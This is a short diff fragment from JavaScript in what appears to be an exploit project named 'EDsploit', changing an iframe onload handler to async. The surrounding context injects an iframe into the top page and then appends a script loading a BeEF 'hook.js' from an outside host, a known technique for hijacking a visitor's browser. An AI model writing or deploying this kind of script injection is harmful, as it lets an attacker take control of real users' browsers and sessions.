@@ -74,7 +74,7 @@ async function iframe() {
 	i.className = 'EDsploit';
 	window.top.document.body.appendChild(i);
         
-	i.onload = () => {
+	i.onload = async () => {
 		const beef = window.top.document.createElement("script");
 		beef.src = "https://beef.local/hook.js";
 		beef.async = true;
